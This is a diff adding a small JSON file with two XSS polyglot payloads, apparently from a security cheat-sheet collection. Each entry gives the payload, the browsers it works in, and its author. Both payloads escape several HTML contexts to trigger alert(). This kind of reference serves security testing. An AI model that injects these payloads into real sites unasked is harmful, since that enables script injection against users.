@@ -1,0 +1,26 @@
+[
+    {
+        "description": "Polyglot payload 1",
+        "code": "javascript:\/*--><\/title><\/style><\/textarea><\/script><\/xmp><svg\/onload='+\/\"\/+\/onmouseover=1\/+\/[*\/[]\/+alert(1)\/\/'>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "author": "Gareth Heyes",
+        "authorLink": "https:\/\/twitter.com\/garethheyes"
+    },
+    {
+        "description": "Polyglot payload 1",
+        "code": "javascript:\"\/*'\/*`\/*--><\/noscript><\/title><\/textarea><\/style><\/template><\/noembed><\/script><html \\\"\n onmouseover=\/*&lt;svg\/*\/onload=alert()\/\/>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "author": "Crlf",
+        "authorLink": "http:\/\/polyglot.innerht.ml\/"
+    }
+]
